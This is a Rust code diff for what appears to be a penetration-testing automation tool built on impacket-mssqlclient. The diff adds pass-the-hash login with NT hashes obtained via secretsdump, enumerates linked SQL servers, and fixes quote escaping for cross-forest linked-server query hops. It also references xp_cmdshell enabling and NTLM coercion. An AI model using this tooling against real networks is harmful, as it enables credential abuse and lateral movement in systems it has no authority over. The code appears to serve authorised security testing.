@@ -9,19 +9,55 @@ use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
 /// Build common MSSQL command prefix with auth and optional -windows-auth flag.
+///
+/// When `hash` is set (and `password` is not the active secret), authenticate
+/// via impacket pass-the-hash: `-hashes :NT` plus the password-less
+/// `user@target` form. This lets callers connect as an owned principal we hold
+/// only an NT hash for — e.g. the linked-server pivot must ride the specific
+/// domain login the link's `sp_addlinkedsrvlogin` mapping is keyed on, which
+/// we typically own via secretsdump (hash) rather than plaintext.
 fn mssql_base(
     domain: Option<&str>,
     username: &str,
     password: Option<&str>,
+    hash: Option<&str>,
     target: &str,
     windows_auth: bool,
 ) -> CommandBuilder {
-    let auth_str = credentials::impacket_target(domain, username, password, target);
-
     CommandBuilder::new("impacket-mssqlclient")
-        .arg(&auth_str)
-        .arg_if(windows_auth, "-windows-auth")
+        .args(mssql_auth_args(
+            domain,
+            username,
+            password,
+            hash,
+            target,
+            windows_auth,
+        ))
         .timeout_secs(120)
+}
+
+/// Build the impacket-mssqlclient auth argv: the `domain/user[:pass]@target`
+/// string, an optional `-windows-auth`, and optional `-hashes :NT` for
+/// pass-the-hash. When a hash is supplied the password is dropped so the
+/// target string stays password-less (impacket rejects a target that carries
+/// both a password and `-hashes`).
+fn mssql_auth_args(
+    domain: Option<&str>,
+    username: &str,
+    password: Option<&str>,
+    hash: Option<&str>,
+    target: &str,
+    windows_auth: bool,
+) -> Vec<String> {
+    let pw = if hash.is_some() { None } else { password };
+    let mut argv = vec![credentials::impacket_target(domain, username, pw, target)];
+    if windows_auth {
+        argv.push("-windows-auth".to_string());
+    }
+    if let Some(h) = hash {
+        argv.extend(credentials::hash_args(h));
+    }
+    argv
 }
 
 /// Pipe a SQL query via stdin to an mssqlclient CommandBuilder and execute.
@@ -34,11 +70,23 @@ fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
     let password = optional_str(args, "password");
+    let hash = optional_str(args, "hash")
+        .or_else(|| optional_str(args, "nt_hash"))
+        .or_else(|| optional_str(args, "hashes"));
     let domain = optional_str(args, "domain");
+    // Domain auth — whether by password or pass-the-hash — goes through
+    // -windows-auth; a hash implies NTLM against a domain account.
     let windows_auth = optional_bool(args, "windows_auth")
-        .unwrap_or_else(|| domain.is_some_and(|d| !d.is_empty()));
+        .unwrap_or_else(|| hash.is_some() || domain.is_some_and(|d| !d.is_empty()));
 
-    Ok(mssql_base(domain, username, password, target, windows_auth))
+    Ok(mssql_base(
+        domain,
+        username,
+        password,
+        hash,
+        target,
+        windows_auth,
+    ))
 }
 
 /// Execute a SQL command via impacket-mssqlclient.
@@ -118,8 +166,23 @@ pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `target`, `username`
 /// Optional args: `password`, `domain`, `windows_auth`
+///
+/// Queries `sys.servers WHERE is_linked = 1` rather than `sp_linkedservers`.
+/// `sp_linkedservers` returns a multi-column row set whose first data row is
+/// NOT reliably the local server — rows come back name-sorted, so an
+/// alphabetically earlier linked server (e.g. `sql01`) can precede the local
+/// `HOST\INSTANCE`, and the old parser dropped row 0 as "self", silently
+/// discarding the real cross-forest link. Its `SRV_PRODUCT` value `SQL Server`
+/// also contains a space that breaks whitespace-column parsing. `is_linked = 1`
+/// excludes the local server (server_id 0) at the source and returns a single
+/// `name` column — one linked server per row, unambiguous to parse. See
+/// `parsers::mssql::parse_mssql_linked_servers`.
 pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
-    mssql_query(mssql_from_args(args)?, "EXEC sp_linkedservers;").await
+    mssql_query(
+        mssql_from_args(args)?,
+        "SELECT name FROM sys.servers WHERE is_linked = 1;",
+    )
+    .await
 }
 
 /// Wrap `inner_query` in a source-side `EXECUTE AS LOGIN` if requested.
@@ -146,10 +209,24 @@ pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
     let query = required_str(args, "query")?;
     let impersonate_user = optional_str(args, "impersonate_user");
 
-    let hop = format!("EXEC ('{query}') AT [{linked_server}];");
+    let hop = build_linked_exec_hop(query, linked_server);
     let full_query = wrap_execute_as(&hop, impersonate_user);
 
     mssql_query(mssql_from_args(args)?, &full_query).await
+}
+
+/// Build the `EXEC ('<query>') AT [<link>]` statement that hops `query` to a
+/// linked server.
+///
+/// The argument to `EXEC (...)` is a single-quoted string literal, so any
+/// single quote inside `query` (e.g. `IS_SRVROLEMEMBER('sysadmin')`) would
+/// terminate that literal early and the *source* server rejects the whole
+/// statement with "Incorrect syntax near 'sysadmin'" before the hop ever
+/// reaches the linked server. Double every embedded single quote — the same
+/// handling the OPENQUERY path applies to its inner string.
+fn build_linked_exec_hop(query: &str, linked_server: &str) -> String {
+    let escaped = query.replace('\'', "''");
+    format!("EXEC ('{escaped}') AT [{linked_server}];")
 }
 
 /// Enable xp_cmdshell on a linked MSSQL server.
@@ -219,9 +296,102 @@ pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
 
 #[cfg(test)]
 mod tests {
+    use super::{build_linked_exec_hop, mssql_auth_args};
     use crate::args::{optional_bool, optional_str, required_str};
     use crate::credentials;
     use serde_json::json;
+
+    #[test]
+    fn auth_args_password_form() {
+        let argv = mssql_auth_args(
+            Some("contoso.local"),
+            "alice",
+            Some("P@ssw0rd!"),
+            None,
+            "192.168.58.51",
+            true,
+        );
+        assert_eq!(
+            argv,
+            vec![
+                "contoso.local/alice:P@ssw0rd!@192.168.58.51".to_string(),
+                "-windows-auth".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn auth_args_pass_the_hash_drops_password_and_adds_hashes() {
+        // Owned via secretsdump (NT hash, no plaintext): the linked-server
+        // pivot must connect as this exact login, so pass-the-hash is required.
+        let argv = mssql_auth_args(
+            Some("contoso.local"),
+            "alice",
+            None,
+            Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
+            "192.168.58.51",
+            true,
+        );
+        assert_eq!(
+            argv,
+            vec![
+                "contoso.local/alice@192.168.58.51".to_string(),
+                "-windows-auth".to_string(),
+                "-hashes".to_string(),
+                "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn auth_args_bare_nt_hash_gets_lm_prefix() {
+        let argv = mssql_auth_args(
+            Some("contoso.local"),
+            "alice",
+            None,
+            Some("31d6cfe0d16ae931b73c59d7e0c089c0"),
+            "192.168.58.51",
+            true,
+        );
+        assert_eq!(argv[2], "-hashes");
+        assert_eq!(argv[3], ":31d6cfe0d16ae931b73c59d7e0c089c0");
+    }
+
+    #[test]
+    fn from_args_reads_hash_and_forces_windows_auth() {
+        let args = json!({
+            "target": "192.168.58.51",
+            "username": "alice",
+            "domain": "contoso.local",
+            "hash": ":31d6cfe0d16ae931b73c59d7e0c089c0",
+        });
+        // windows_auth defaults true because a hash is present.
+        let hash = optional_str(&args, "hash");
+        assert!(hash.is_some());
+        let windows_auth = optional_bool(&args, "windows_auth").unwrap_or_else(|| hash.is_some());
+        assert!(windows_auth);
+    }
+
+    #[test]
+    fn linked_exec_hop_doubles_inner_single_quotes() {
+        // The sysadmin-status probe query carries `'sysadmin'`; without quote
+        // doubling the source server errors with "Incorrect syntax near
+        // 'sysadmin'" and the cross-forest hop never fires.
+        let hop = build_linked_exec_hop("SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sa;", "SQL02");
+        assert_eq!(
+            hop,
+            "EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'') AS is_sa;') AT [SQL02];"
+        );
+        // The outer EXEC string literal must have balanced quotes: an even
+        // number of single quotes total once the inner ones are doubled.
+        assert_eq!(hop.matches('\'').count() % 2, 0);
+    }
+
+    #[test]
+    fn linked_exec_hop_quote_free_query_unchanged() {
+        let hop = build_linked_exec_hop("SELECT @@SERVERNAME AS srv;", "SQL02");
+        assert_eq!(hop, "EXEC ('SELECT @@SERVERNAME AS srv;') AT [SQL02];");
+    }
 
     // --- mssql_from_args required fields ---
 
